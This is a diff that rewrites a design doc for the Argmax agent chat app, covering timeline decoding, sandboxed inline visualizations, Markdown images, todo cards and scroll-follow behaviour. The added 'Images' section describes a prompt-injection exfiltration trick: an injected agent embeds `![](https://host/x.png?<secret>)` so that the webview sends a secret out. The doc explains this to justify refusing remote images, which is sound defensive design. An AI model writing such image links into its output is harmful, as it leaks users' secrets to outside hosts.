@@ -1,766 +1,338 @@
-# Chat Surface and Interactive Cards
+# Chat Surface
 
-The chat surface renders assistant bubbles, tools, and interactive cards: **QuestionDock** for `AskUserQuestion` / Cursor's `askQuestionToolCall` while the agent is waiting, and **TodoCard**, the agent's own running plan.
+The chat renders normalized timeline events as turns, activity rows, and cards. This doc holds what one file cannot show: how the parts connect, and why surprising choices exist. Sizes, timings, and per-component behavior belong to the components and their tests.
 
-## Inline visualizations
+## Where things live
 
-Agents use `visualization_preview` with one HTML or file source, then
-`visualization_publish` with the returned `draftId`. Preview captures a saved
-draft, screenshot, content height, console/resource diagnostics, and external
-dependencies. Publication uses that exact draft and is idempotent. Capture is
-currently macOS-only. An unavailable preview reports its failure and still lets
-the agent publish the draft.
+| Concern | Owner |
+|---|---|
+| Timeline decoding | [canonicalTimeline.ts](../src/renderer/lib/canonicalTimeline.ts), [timeline_semantics.rs](../src-tauri/crates/argmax-store/src/timeline_semantics.rs) |
+| Which events appear | `isConversationVisible` in [sessionConversationModel.ts](../src/renderer/lib/sessionConversationModel.ts) |
+| Turn folding | [foldConversation.ts](../src/renderer/lib/foldConversation.ts), [sessionTurnView.ts](../src/renderer/lib/sessionTurnView.ts) |
+| Conversation shell and turns | [SessionConversation.tsx](../src/renderer/components/SessionConversation.tsx), [SessionConversationTurn.tsx](../src/renderer/components/SessionConversationTurn.tsx), [TurnBlock.tsx](../src/renderer/components/TurnBlock.tsx) |
+| Tool identity and summaries | [toolCalls.ts](../src/renderer/lib/toolCalls.ts), [ToolCallGroupBubble.tsx](../src/renderer/components/ToolCallGroupBubble.tsx), [ToolCallDetail.tsx](../src/renderer/components/ToolCallDetail.tsx) |
+| Scrolling | [useConversationScroll.ts](../src/renderer/hooks/useConversationScroll.ts) |
+| Streaming Markdown | [StreamingMarkdown.tsx](../src/renderer/components/StreamingMarkdown.tsx) |
+| Composer | [SessionComposer.tsx](../src/renderer/components/SessionComposer.tsx), [LaunchSurface.tsx](../src/renderer/components/LaunchSurface.tsx), [ComposerEditor.tsx](../src/renderer/components/ComposerEditor.tsx) |
+| iPhone transcript | [ios/Argmax/Sources/Transcript](../ios/Argmax/Sources/Transcript) |
 
-Published HTML and image artifacts belong to the caller's chat. Rust persists
-one `visualization.published` event with normalized semantics. The main chat,
-agent views, and multitask chats consume that meaning. A child publishes in its
-own chat, accessible through the parent's multitask view.
-
-Artifacts use immutable IDs under the owning session's attachment directory.
-They survive original-file and checkout removal, and workspace archive. Hard
-chat deletion removes them with the session's attachments. Fork and copied
-history clone referenced artifacts into the destination session.
-
-HTML source is capped at 1,000,000 bytes. Ingestion validates image bytes and
-embeds confined local image references, including `srcset`, CSS URLs, and
-supported quoted script paths. Individual images are capped at 10 MiB and the
-complete snapshot at 25 MiB. External resources remain visible in the card.
-Offline durability requires a snapshot with no external dependencies.
-
-One generated, versioned runtime lives in `assets/visualization-runtime.json`.
-`scripts/build-visualization-runtime.mjs` builds it from
-`src/shared/visualization/` and bundled licensed Lucide. Rust builds the complete
-HTML document for desktop, native iOS, preview, and standalone export.
-
-Desktop uses an opaque iframe with `sandbox="allow-scripts"`. Native iOS uses a
-nonpersistent WKWebView with restricted navigation and no app IPC or browser
-cookies. Preview uses a separate incognito native window, removes injected app
-scripts, and supplies a timer animation-frame clock for hidden layout. The CSP
-blocks API requests, forms, frames, and unapproved resources.
-
-Both hosts expose theme updates, responsive height, expand, source inspection,
-export, retry, and design controls. Offscreen desktop frames can unmount. Native
-iOS limits live visualization webviews to three and offers activation when needed.
-On iOS, expand opens a full-screen viewer with a separate height measurement.
-Closing reloads saved state and restores the inline card's original height.
-
-`window.openai.widgetState`, `setWidgetState`, and `openai:set_globals` restore
-meaningful interactions. Snapshots stay under 16 KiB. `privateContent` stays out
-of model context. State writes do not start a turn. Tweak control edits persist
-separately, so they do not replace the page's widget state. Reset and temporary
-original preview use the original source values.
-
-`sendFollowUpMessage` shows a host-owned request. The reader chooses Prepare
-follow-up to merge it into that chat's composer, then sends through the normal
-flow. Scripts cannot send a provider message. Links use a host Open action.
-Standalone exports retain local state and report unavailable chat actions.
-
-The exposed visualize skill can still emit a standalone marker:
-
-```text
-visualize{"path":"/absolute/checkout/chart.html","mode":"wide","title":"Trends"}
-```
-
-The marker adapter imports the file into the same artifact service. Rust resolves
-the source event's user turn and preserves that turn's origin through copied history.
-Desktop and iOS therefore reopen the same snapshot and saved state. Repeated
-markers within one turn share a snapshot. A later turn can reuse the path and
-receive a new snapshot. Use publication IDs for distinct revisions within one turn. Markers inside code
-remain literal. Incomplete references show loading. Invalid or missing sources
-show an explicit error. `mode` and `title` remain optional.
-
-Native Mermaid, math, Markdown tables, and images keep their existing renderers.
-They do not need an HTML artifact to appear in chat.
-
-## Components and Structure
-
-Settings → General → **Escape stops a running chat** optionally binds Escape
-to the focused chat's Stop action. It is off by default. Menus, autocomplete,
-Settings, and the right sidebar consume Escape before a chat can stop, so one
-press closes one surface. With nothing to dismiss, Escape also works from the
-chat composer. Terminal and code-editor input keep their own Escape behavior.
-Holding Escape does not dismiss successive surfaces or stop a newly revealed
-chat.
-Stopping with Escape within the first ten seconds uses the same early-stop
-behavior as the Stop button: restore the launcher with its prompt and project,
-then archive the short-lived chat after the stop succeeds.
-
-- **Conversation Shell:** [SessionConversation.tsx](../src/renderer/components/SessionConversation.tsx) derives timeline projections, thinking states, turn models, and scroll anchoring.
-- **Turns & Cards:** [SessionConversationTurn.tsx](../src/renderer/components/SessionConversationTurn.tsx) renders individual turns and their card containers. The question is the exception: the turn never draws it. [SessionConversation.tsx](../src/renderer/components/SessionConversation.tsx) hoists the live one into [QuestionDock.tsx](../src/renderer/components/QuestionDock.tsx), and an answered one is not drawn at all.
-- **Timeline Logic:** [canonicalTimeline.ts](../src/renderer/lib/canonicalTimeline.ts) decodes persisted rows into one typed event contract. [sessionConversationModel.ts](../src/renderer/lib/sessionConversationModel.ts) uses that contract for event filtering, raw transcript suppression checks, tool pairing, and last-significant-event selection.
-- **Composer:** [SessionComposer.tsx](../src/renderer/components/SessionComposer.tsx) handles prompt inputs, file attachments, the model chip, follow-up queues, send/stop, and `/clear`. ↑ in an empty chat composer recalls the user's sent messages newest first, ↓ steps forward again to an empty draft; editing a recalled message, or a draft the user typed, gives the arrows back to the caret. The launcher has no history, so it does not recall. The launcher composer in [LaunchSurface.tsx](../src/renderer/components/LaunchSurface.tsx) cycles Auto / Chat with Tab; Auto is the resting mode and shows no chip, so the chip appears only on Chat (the command palette lists both). Chat launches a scratch workspace with no repository attached, so the project picker hides and no longer offers a Chat row. The project chip is the source of truth while composing: Full-view new chat hides the grid without dropping it, and a dashboard delta must not retarget the picker back to that hidden session's repo. The last project the user picked is persisted ([launchProjectPreference.ts](../src/renderer/lib/launchProjectPreference.ts)) and survives leaving new chat to open a session: the next new chat shows that project, not the session they just viewed. Both the project picker and the model picker list recently chosen rows first. Mid-turn the model chip still offers every provider: a pick for another provider queues the follow-up bound for that provider, and the chat switches to it when the turn ends (see Follow-up Queuing). Stopping a just-launched chat within 10 seconds restores this composer with the prompt and target kept, and archives the workspace so the cancelled chat does not stay in the sidebar ([earlyStop.ts](../src/renderer/lib/earlyStop.ts)). Under width the model and its effort outrank the workspace: the toolbar's spacer collapses first, then the branch label ellipsizes, and below the 600px container breakpoint (the composer's own width) the branch and the changed-file count fold together behind a `…` anchored to `.composer-chips-context-group` — the count is the way into the Changes panel, so it folds rather than disappears, and the trigger carries a dot while the tree is dirty. The panel opens upward, unlike the launcher's, because this composer is docked to the bottom of the pane.
-- **Actions Menu:** [SessionActionsMenu.tsx](../src/renderer/components/SessionActionsMenu.tsx) handles workspace actions, PR refreshes, git shortcuts, and panel toggles.
+A new event type renders nowhere until it is added to `isConversationVisible`. Unit tests of the fold still pass without it.
 
 ## Timeline meaning
 
-Rust derives a typed `semantic` contract for every timeline row, including
-rows recorded before the contract existed. The derivation runs when SQLite
-returns a row and when a new row is published. It does not rewrite historical
-payloads. [timeline_semantics.rs](../src-tauri/src/persistence/timeline_semantics.rs)
-owns message role and phase, tool identity and outcome, approval identity,
-multitask and error kind, and session lifecycle names. Its `context` holds provider invocation and child
-identity. The raw `type` and `payload` stay on each row for diagnostic details
-and presentation data such as tool input, output, and file changes.
+Rust derives a typed `semantic` contract for every timeline row. It runs when SQLite returns a row and when a new row is published, so old payloads are never rewritten. The raw `type` and `payload` stay on the row for diagnostics and presentation data.
 
-The desktop and iPhone use the semantic contract for routing, correlation, and
-failure state. An older host may omit `semantic`; each client retains a
-bounded legacy decoder for those rows. A future event kind has an explicit
-unknown path, so it cannot be mistaken for a message or tool. The shared
-[timeline fixtures](../src/shared/timelineSemanticFixtures.json) pin the Rust
-producer and both clients to the same wire examples.
-The iPhone semantic DTOs come from the Rust TypeScript binding through
-`scripts/export-swift-contracts.mjs`. Read-side enum values stay strings so
-an added role or phase remains decodable. Unknown event kinds become `.unknown`.
-Outbound request enums are closed and reject unsupported values before send.
+Desktop and iPhone route on `semantic`, not on raw types. An older host may omit it, so each client keeps a bounded legacy decoder. A future event kind takes an explicit unknown path, so it cannot be mistaken for a message or a tool. [timelineSemanticFixtures.json](../src/shared/timelineSemanticFixtures.json) pins the producer and both clients to the same wire examples.
 
-The launch composer defaults to **Local**. Its Local / Cloud chip launches the
-hosted agent for the selected Claude, Codex, or Cursor provider while preserving
-the local model choice. Cloud mode names that hosted provider and hides local-only
-model, effort, and worktree controls. Sending opens a compact confirmation with
-the prompt, pushed source, and cloud environment. The prompt is read-only, so it
-is written once in the composer. It starts no local agent. Cancelling or a launch
-error preserves the draft. Cloud tasks currently accept text only, and local
-goals must be removed or sent with Local instead. The result links directly to
-the hosted task without claiming it was saved to a local chat. See
-[providers.md](providers.md#cloud-tasks).
+Provider protocol output is not chat. Visible chat comes from normalized events. Raw transcript fallback is only for human-readable stdout and stderr.
 
-An active chat can use `/cloud <prompt>` for the same flow. Argmax confirms the
-current prompt once, lets the user inspect the full brief (the bounded chat
-context, closed by that prompt) behind a disclosure, and clears the draft only
-after the hosted task launches. A launch that may have created the task without
-returning a link ("Task status unknown") offers no resend, only a link to the
-provider's task list.
+## Inline visualizations
 
-Failed launcher actions use the shared bottom-right error toast and preserve serialized backend messages. Draft validation stays below the controls. A failed branch switch keeps the current branch and draft, and returns focus to the prompt if the launcher is still active.
+Agents call `visualization_preview`, then `visualization_publish` with the returned `draftId`. Publication uses that exact draft and is idempotent. Capture is macOS-only. A failed preview still lets the agent publish.
 
-Editing a queued follow-up restores its images alongside the text. Choosing
-New chat during a provider switch moves the whole draft, including images,
-to the launcher on desktop and mobile.
+Published artifacts belong to the caller's chat. They live under the session's attachment directory with immutable IDs, so they survive removal of the original file, the checkout, and the workspace. Deleting the chat removes them. Fork and copied history clone the referenced artifacts into the destination session.
 
-Opening a chat retries a failed history read twice before showing an inline
-Retry action. Transient failures stay quiet. After retries are exhausted,
-available replies and new live output remain readable beside the retry notice.
+Limits live in [visualizations/store.rs](../src-tauri/src/visualizations/store.rs). Ingestion embeds confined local images. External resources stay visible in the card, so offline durability requires a snapshot with no external dependencies.
 
-Composer autofocus belongs to the active pane. Selecting a session or new-chat
-pane focuses its composer. Background mounts, send completions, and launcher
-updates cannot claim focus. Inactive multitask tabs follow the same rule even
-though they remain mounted. Deliberately opening a picker or review control
-keeps that control usable while the pane remains active.
+[assets/visualization-runtime.json](../assets/visualization-runtime.json) is generated by `scripts/build-visualization-runtime.mjs` from `src/shared/visualization/`. Rust builds the HTML document for desktop, iOS, preview, and export.
 
-The launcher subscribes to project preference changes independently of dashboard
-selection. Picking the dashboard's already-selected repo must still repaint a
-launcher that remembers another repo. While composing, the sidebar uses the
-launcher's project too, so clicking a different repo opens it instead of treating
-it as already open and collapsing its chats.
+The sandbox is the security boundary:
+
+- Desktop uses an opaque iframe with `sandbox="allow-scripts"`.
+- iOS uses a nonpersistent WKWebView with restricted navigation, and no app IPC or browser cookies.
+- Preview uses a separate incognito native window.
+- The CSP blocks API requests, forms, frames, and unapproved resources.
+- Scripts cannot send a provider message. `sendFollowUpMessage` only shows a request, and the reader merges it into the composer.
+- `privateContent` stays out of model context, and state writes never start a turn.
+
+A standalone `visualize{"path":…}` marker imports through the same artifact service. Repeated markers within one turn share a snapshot, so use publication IDs for distinct revisions.
+
+Mermaid, math, tables, and images keep their own renderers. They need no HTML artifact.
+
+## Answers
+
+### Images
+
+An image reaches the user only through Markdown. An image a tool returned reaches the model, not the chat. [MarkdownImage.tsx](../src/renderer/components/MarkdownImage.tsx) serves saved attachments through `argmax-attachment://`, and other absolute paths through `argmax-asset://`. The asset handler accepts paths inside a project, a workspace root, or a temp directory.
+
+A remote `http(s)` image is drawn as a link and is never fetched. Fetching one is a silent outbound request. A prompt-injected agent could write `![](https://host/x.png?<secret>)` and have the webview carry the secret out. `resolveChatImageSrc` and the phone's `TranscriptMarkdownImageSource` both refuse these.
+
+### Diagrams
+
+A fenced `mermaid` or `mmd` block renders as SVG through [MermaidDiagram.tsx](../src/renderer/components/MermaidDiagram.tsx), themed from live CSS tokens. A wide drawing breaks out of the prose measure. The MCP server instructions tell agents that this is how a diagram reaches the user.
+
+### Math
+
+`normalizeMathDelimiters.ts` and the phone's `TranscriptMarkdownPreparation.swift` decide what counts as math. The rule keeps prices (`$1.25/1M in and $4.25`) and shell variables (`$PATH and $HOME`) as plain text. One table in [fixtures/parity](../fixtures/parity) holds both to the same answers.
+
+### Streaming
+
+Three decisions shape [StreamingMarkdown.tsx](../src/renderer/components/StreamingMarkdown.tsx):
+
+- **The reveal is paced, because providers do not stream alike.** Claude sends small deltas, Codex and OpenCode land one `message.completed`, and Cursor bursts. The reveal eases toward the end of the arrived text and snaps to word boundaries.
+- **Only the open block re-parses.** Earlier blocks are final, so a long answer stays cheap ([markdownBlocks.ts](../src/renderer/lib/markdownBlocks.ts)). A document with a reference-link definition stays one block, because a definition resolves across the whole document.
+- **Restored text never types.** Reopening a session paints arrived text in full (`useRestoreWithoutMotion`). A hidden document also snaps, because a backgrounded window cannot show the frames.
+
+### Links and file chips
+
+Every `http(s)` link is one component, [WebLink.tsx](../src/renderer/components/WebLink.tsx). It owns the routing decision. The system browser needs an explicit `system:open-path`, because the Tauri webview swallows `target="_blank"`.
+
+[fileChipPath.ts](../src/renderer/lib/fileChipPath.ts) decides what becomes a file chip. An anchored path with no extension stays code until a stat confirms a file, because `/api/users` looks the same as `/etc/hosts`. A path outside the workspace opens as a read-only external tab, and no write channel exists for those tabs.
 
 ## The todo card
 
-Every provider can publish a plan, and each publishes it differently. The
-normalizer reduces all five dialects to one `todo.updated` event
-([todo.rs](../src-tauri/src/providers/normalizer/todo.rs)):
+Each provider publishes a plan differently. The normalizer reduces all five dialects to one `todo.updated` event in [todo.rs](../src-tauri/src/providers/normalizer/todo.rs).
 
-```jsonc
-{ "mode": "snapshot" | "merge",
-  "items": [{ "id": string|null, "text": string|null, "status": Status }],
-  "toolUseId": string|null }
-```
+Two rules keep the event honest:
 
-`Status` is `pending | active | done | cancelled | removed`, resolved in Rust so
-the renderer's fold is provider-blind. Two rules keep it honest: **no list in
-the payload means no event** — Cursor's ACP `updateTodos` opens with the list
-stripped, and an empty snapshot would wipe a list the user is reading — and
-**every status arrives resolved**, so `TODO_STATUS_IN_PROGRESS`, `inProgress`
-and `in_progress` all become `active` in one place.
+- No list in the payload means no event. An empty snapshot would wipe a list the user is reading.
+- Every status arrives resolved, so the renderer's fold is provider-blind.
 
-| Provider | Source | Shape |
-| --- | --- | --- |
-| Codex | app-server `turn/plan/updated` | snapshot, with a real `inProgress` |
-| OpenCode | `todowrite` args | snapshot, no ids |
-| Grok | ACP: `TodosUpdated` inside a tool result; CLI: `todo_write` args | snapshot (ACP, keyed by id) or `merge:true` delta (CLI) |
-| Cursor | `updateTodosToolCall` / `todo_write` / `todowrite` args; ACP `plan` from CreatePlan | as shaped; `plan` is a snapshot, no ids |
-| Claude | `TaskCreate` result + `TaskUpdate` args | merge, one task per call |
+The card is a fold over persisted events ([todoList.ts](../src/renderer/lib/todoList.ts)), not a read of the newest one. Three providers send deltas. The normalizer's memory lasts one provider invocation, so a Rust-side list would reset on every follow-up. Folding persisted rows also replays across restart, resume, and session sync.
 
-Three of the five send deltas, so the card is a **fold over the persisted
-events** ([todoList.ts](../src/renderer/lib/todoList.ts)) rather than a read of
-the newest one. The fold lives in the renderer because the normalizer's memory
-is per provider *invocation* — a Rust-side list would reset on every follow-up
-turn, and Grok's textless merge deltas would fold into nothing. Folding
-persisted rows also replays for free across restart, resume, and session sync.
+Each turn that touched the plan gets its own card, showing the plan as it stood when that turn ended. Scrolling back therefore does not rewrite history. The iPhone uses the same fold in [TranscriptProjection.swift](../ios/Argmax/Sources/Transcript/TranscriptProjection.swift).
 
-The card reports provider state rather than inferring progress from assistant
-prose. Argmax gives Codex application context to call `update_plan` when each
-step finishes, before it starts the next step. This keeps the live card current
-without treating a status message or a successful command as proof that a plan
-step is complete.
-
-Each turn that touched the plan gets its own card showing the plan as it stood
-when that turn ended, so scrolling back does not rewrite history.
-Plan updates follow the same user-message and compaction boundaries as the
-rest of the conversation. A plan can open its turn before any reply text or
-tool activity arrives.
-[TodoCard.tsx](../src/renderer/components/TodoCard.tsx) is expanded while its
-turn runs and collapsed to one line once it ends, until the reader says
-otherwise. On desktop the heading's list glyph sits on the activity connector,
-with checklist items inset beneath it. A sage dot and a quiet halo mark the
-active step, while the label retains the shared reading wave. A completed
-plan carries a sage checkmark in its heading, labelled “All done” for assistive
-technology, without a text tail or separator.
-The iPhone transcript uses the same fold
-([TranscriptProjection.swift](../ios/Argmax/Sources/Transcript/TranscriptProjection.swift))
-and the same card grammar
-([TranscriptTodoRow](../ios/Argmax/Sources/Transcript/TranscriptRows.swift)):
-expanded while its turn runs, collapsed to one line once it ends. Compact and
-Minimal keep the plan as its own row; it does not fold into the activity
-summary.
-
-Grok is the one provider whose two transports disagree: over ACP — which is
-what Argmax launches — the list arrives inside a *tool result* as a JSON string
-under `TodosUpdated`. `state.todos` is a map keyed by id. Numeric ids sort as
-numbers so step 10 does not land between 1 and 2. Slug ids (`group`, `babysit`)
-serialize alphabetically in that map, which is not the plan order, so the
-ordered sibling `todos` array is preferred when present, then
-`summary_for_prompt`, then numeric key order. Its CLI path sends the
-`todo_write` array instead. Both are read.
-
-Cursor's ACP `updateTodos` opens as `{"_toolName":"updateTodos"}` and then
-streams the list into `rawInput` one item per update (`[alpha]`, then
-`[alpha, beta]`, …). The ACP translation in
-[cursor_acp.rs](../src-tauri/src/providers/cursor_acp.rs) therefore draws a todo
-call's row only at completion, from the last list it saw; drawn from the
-opening line it published nothing, and from the first named update a one-item
-list. Cursor also sends each list as a `cursor/update_todos` extension request,
-which Argmax answers with method-not-found so the list is published once.
-ACP's `plan` update comes only from Cursor's CreatePlan tool. It is a snapshot
-of entries without ids, and a plan with no todos arrives as one
-`high`-priority entry holding the plan's own name, which is dropped.
+Rows that carried an update are hidden by the `surface: "todo"` stamp, never by tool name. Tool names move between CLI versions, and a name rule would fail with no test failing. `HIDDEN_TOOL_NAMES` only covers sessions persisted before the stamp.
 
 Known gaps:
 
-- **Cursor's plan items have no ids.** A later `updateTodos` with
-  `merge: true` addresses the ids CreatePlan assigned, which the `plan` update
-  never carried, so the fold appends those rows beside the plan's instead of
-  updating them. A `merge: false` list replaces the plan outright.
-- **Claude's task id exists only in prose.** `TaskCreate` returns
-  ``Task #${id} created successfully: ${subject}``, and `TaskUpdate` addresses
-  that id. When that literal changes the task still reaches the card, keyed by
-  its tool-use id, and a `tracing::warn!` names the text that did not parse.
-- **Claude's task tools need an opt-in for current models.** Claude Code
-  2.1.282 enables `TaskCreate` / `TaskUpdate` only for the 4.x models, so the
-  inline `--settings` env sets `CLAUDE_CODE_ENABLE_TODO_TOOLS=true`; without
-  it no todo card ever appears. See
-  [providers.md](providers.md#the-agents-todo-list).
-
-The rows that carried an update are hidden by the `surface: "todo"` stamp the
-normalizer writes, never by tool name. Names move — Claude renamed `TodoWrite`
-to `TaskCreate`/`TaskUpdate` this year — and a name-based rule would leave a
-stale card plus an unlabelled tool row with no test failing. The name list in
-`HIDDEN_TOOL_NAMES` only still covers sessions persisted before the stamp.
+- **Cursor's plan items have no ids.** A later `merge: true` update addresses ids the plan never carried, so the fold appends rows beside the plan's.
+- **Claude's task id exists only in prose.** If the `TaskCreate` result text changes, the task still reaches the card, keyed by its tool-use id, and a `tracing::warn!` names the text.
+- **Claude's task tools need an opt-in.** See [providers.md](providers.md#the-agents-todo-list).
 
 ## Follow scroll
 
-[useConversationScroll.ts](../src/renderer/hooks/useConversationScroll.ts) owns
-scrolling in the chat, a single agent run, and persistent agent history. Each
-has one scroll viewport and one content wrapper. The scroll-to-latest button
-is an absolute overlay outside the viewport, so its visibility cannot change
-the transcript height.
+[useConversationScroll.ts](../src/renderer/hooks/useConversationScroll.ts) owns scrolling in the chat, a single agent run, and agent history. `scripts/check-chat-scroll.mjs` checks this behavior in a real browser ([verification.md](verification.md)).
 
-Following or detached lives outside React state, in the controller's
-`follow` object. A detach lands mid-gesture, and as host state it re-rendered
-every mounted turn, tool group, and bubble there (about 1,500 components on a
-98-turn chat). Now only `ScrollToLatestButton` subscribes. The tail windows
-read the value when they render for another reason, and on a return to
-following they render only if their mounted rows went stale.
-While detached, a list that fits its render window still accepts new rows.
-Only a window that would evict mounted rows freezes its IDs. If folding removes
-every retained row, the window shows the current tail. This lets a finished
-Minimal answer appear without requiring a scroll to resume following.
-The turn's window is applied after Minimal folds finished activity, so hidden
-tools cannot occupy the window and exclude the answer.
+The contract:
 
-A notched mouse wheel is eased, not jumped.
-[smoothWheel.ts](../src/renderer/lib/smoothWheel.ts) runs on every scroll
-viewport the controller owns. WebKit on macOS applies a wheel event with no
-gesture phase as an instant jump, and a fast spin moves 150–600px per event.
-JS cannot see the device, so the rule comes from a real Safari log: every
-trackpad gesture opens at |deltaY| 1–2, every mouse event is at least 12px.
-The first event after a 60ms pause classifies the whole gesture. Mouse
-gestures are taken over and eased (exponential, τ 45ms). Trackpads, the Magic
-Mouse, zoom, Shift+wheel, reduced motion, and scroll edges stay native. The
-easing reads `scrollTop` each frame, so anchor corrections and a scrollbar
-drag win. The listener is non-passive, which moves wheel scrolling over the
-transcript to the main thread for trackpads too. That is why the scroll path
-stays cheap. `check-chat-scroll.mjs` covers easing up, streamed growth
-mid-ease, and easing back to the bottom.
+- The controller follows the bottom until the reader moves upward.
+- Only a return to the bottom, a new prompt, a session switch, or the scroll-to-latest button resumes following. A content resize alone never does.
+- A steer keeps the existing turn's anchor and leaves following or detached reading intact.
+- While detached, layout changes preserve the visible anchor.
 
-The controller follows the physical bottom until the reader moves upward.
-An upward wheel or touch gesture releases following before the browser moves
-the viewport. Scroll events record the reading position. Layout reconciliation
-owns programmatic scroll writes. Reaching the bottom by scrolling downward,
-sending a new turn's prompt, switching session, or clicking scroll-to-latest
-resumes following. A steer keeps the existing turn's scroll anchor and leaves
-following or detached reading intact. It stays visible in the transcript without
-being pushed to the top of the viewport. Steering messages appear chronologically
-inside the active turn, keeping its timer and running activity together. They
-remain visible when finished activity collapses. A content resize alone cannot resume
-following.
+Choices that look odd until you know why:
 
-Upward input the scroller cannot act on takes the release back. A reader
-already at the physical bottom still produces it — the macOS overscroll bounce
-reports negative wheel deltas as it snaps back, a thumb drifts upward on a tap
-— and a release there would be permanent, because with nowhere left to move no
-scroll event can arrive to end it. The controller checks two frames later
-(a wheel scroll is composited and can land after its own frame) and resumes
-following if the viewport never moved. WebKit's elastic `scrollTop` values are
-normalized to the physical scroll range before motion is classified, so the
-bounce back from beyond an edge cannot detach a live conversation.
+- **Follow state lives outside React state.** A detach lands mid-gesture. As host state it re-rendered every mounted turn. Only `ScrollToLatestButton` subscribes.
+- **Upward input the scroller cannot act on takes its release back.** The macOS overscroll bounce reports negative deltas at the bottom. With nowhere left to move, no scroll event could end that release, so it would be permanent.
+- **Height is reserved during streaming.** Replacing streamed rows can briefly shrink the scroll range. That clamp must not look like an upward reader scroll.
+- **A detached reader keeps a minimum height.** A folding Thought block below the reader must not clamp them upward.
+- **`overflow-anchor: none`** keeps browser anchoring from competing with the controller.
+- **Windows nest.** A turn and an expanded group each mount a bounded tail ([performance.md](performance.md#transcript-size)). While detached they keep their mounted ids, so new output cannot evict the reader's anchor.
+- **An opened chat fills its window from the bottom up.** The first frame mounts the last few items, and each later frame mounts more above them ([performance.md](performance.md#transcript-size)). Following keeps the bottom pinned through that growth, and a detached reader keeps their anchor, the same as for Show earlier. The anchor is never the Show earlier control (`data-scroll-anchor-skip`), because rows mount below it.
+- **Mouse wheels are eased.** WebKit on macOS applies a phase-less wheel event as an instant jump. JS cannot see the device, so [smoothWheel.ts](../src/renderer/lib/smoothWheel.ts) classifies each gesture by its first event. The listener is non-passive, which is why the scroll path must stay cheap.
 
-Returning to the bottom is recognized before layout reconciliation records
-the position, even if the native scroll event is still queued. If output
-grows in that interval, the controller uses the bottom the reader reached
-before growth. This keeps a render from swallowing the return to live output.
+Argmax owns this controller because `use-stick-to-bottom`'s reattachment near the bottom conflicts with the detached-reading contract.
 
-While following, the controller retains the measured content height between
-reconciliations. Replacing streamed rows can briefly shrink the scroll range
-and then grow it again before a callback runs. Reserving the height prevents
-that temporary clamp from looking like an upward reader scroll. Each
-reconciliation releases the reservation before measuring, so a permanent
-collapse still removes excess space.
-ResizeObserver watches the viewport and direct transcript rows, then reconciles
-before paint. The controller-owned wrapper is excluded so its height changes
-cannot feed back into the observer. Deferring correction by a frame lets an
-earlier row's reflow briefly move the visible prompt before it is restored.
+## User messages
 
-The chat content has a minimum height that lets the latest user message sit
-at the top of the viewport. Output fills that space naturally as the turn
-grows. While detached, the content also retains a minimum height from before
-the gesture. A folding Thought block below the reader therefore cannot
-shorten the scroll range and clamp them upward. This may leave blank space
-below a collapsed turn until the reader resumes following.
+An idle follow-up shows its bubble and Thinking before the send returns. A rejected send removes the local bubble and restores the draft.
 
-The native iPhone transcript follows the same turn rule. Its shrinking tail
-reservation lets a new non-steering user message sit below the transcript's
-top inset until output fills the viewport. A steering message does not change
-the turn anchor, resume following, or move a detached reading position.
+A user bubble shows typed text, not Markdown, so a pasted snippet keeps its line breaks and `**bold**` stays two asterisks. `markUserMessage` adds two things on top:
 
-Detached layout changes preserve the visible anchor. Nested scroll areas use
-their outer box so scrolling a diff cannot look like a transcript layout
-change. If folding removes the anchored row, the controller releases its
-reserved height and clamps the reader to the remaining content when needed,
-while staying detached. This prevents an empty viewport below a finished answer.
-CSS `overflow-anchor: none` keeps browser anchoring from competing
-with the controller. ResizeObserver watches the transcript rows and viewport,
-including composer, panel, and hidden-tab size changes.
+- `/skill` tints, by shape alone, because the transcript has no skills list.
+- Links, for `http(s)` runs only ([messageLinks.ts](../src/renderer/lib/messageLinks.ts)). Guessing a scheme is how "menti.com." becomes a broken link.
 
-Long-session rendering uses nested tail windows as well as the outer transcript
-window. A turn mounts 16 body rows and an expanded activity group mounts 16
-details at a time, with Show earlier controls for older content. While detached,
-those windows retain the exact mounted ids instead of advancing with new output.
-This keeps a single hours-long provider turn bounded without changing its
-logical turn, summaries, copy text, duration, or changed-file accounting.
+Links resolve before skill tokens, so a URL's path segments are not read as invocations.
 
-The design draws on [use-stick-to-bottom](https://github.com/stackblitz-labs/use-stick-to-bottom)'s
-immediate wheel cancellation. Its shrink-triggered reattachment near the
-bottom conflicts with the detached-reading contract here, so Argmax owns this
-controller rather than adapting a second follow state machine around it.
+A prompt from another session is a `user.message` with an `origin` block. The bubble says who sent it, so a reader never mistakes a machine's prompt for their own ([agent-tools.md](agent-tools.md)).
 
-## The Sent Prompt
+## Questions
 
-Sending an idle follow-up clears the composer text and shows its user bubble
-alongside Thinking immediately, before the send request returns. The local
-bubble stays until its persisted `user.message` arrives, then gives way to that
-row without a duplicate. A rejected send removes the local bubble and restores
-the draft for retry. Follow-ups sent mid-turn still use the pending-message queue.
+In headless mode, `AskUserQuestion` returns an error result to signal a pause. Argmax draws a card rather than a failed tool. The error text is Argmax's own, so the model ends the turn instead of reading the CLI's default result as a dismissal ([approvals-checks.md](approvals-checks.md)).
 
-Long user messages have a six-line-height preview with a bottom fade and an
-inline **Show more** / **Show less** control. Desktop measures the rendered
-content against `6 * 1.68em`. The native iOS `TranscriptMessageRow` uses the same
-proportions at the body text size, scaled with Dynamic Type. Only overflowing
-messages show the control, and expansion reveals the full message in place.
+The live question takes the composer's slot in [QuestionDock.tsx](../src/renderer/components/QuestionDock.tsx), because a turn that keeps working would scroll it away. Its behavior is pinned in [SessionConversation.cards.test.tsx](../src/renderer/components/SessionConversation.cards.test.tsx).
 
-A user bubble shows the text that was typed, not markdown: `SessionConversationUserMessage` renders it into a `<p>` with `white-space: pre-wrap` so a pasted snippet keeps its own line breaks and a `**bold**` stays two asterisks. Two things are marked up on top of that plain text, both in `markUserMessage`.
+Three delivery paths exist:
 
-- **`/skill` invocations** keep the tint the composer gave them while they were typed ([slashHighlight.ts](../src/renderer/lib/slashHighlight.ts)). Leading and inline invocations use the same `.skill-token` highlight as both composers, preserving the literal slash, capitalization, and surrounding whitespace. Its ink follows the message foreground for contrast inside a filled bubble. Shape is the whole guard because the transcript has no skills list to check against.
-- **Pasted URLs become links** ([messageLinks.ts](../src/renderer/lib/messageLinks.ts)). Assistant prose gets this free from `remark-gfm`, and a bubble that is deliberately not markdown had no way to click a URL the user had just pasted. The match is `http(s)` runs only: no `www.`, no bare domains, no `mailto:`. Guessing a scheme in text the user did not write as a link is how a sentence ending in "menti.com." becomes a broken one. Trailing sentence punctuation goes back to the sentence, and a closing bracket is kept only when the URL opened it, so a Wikipedia path survives being wrapped in prose parens.
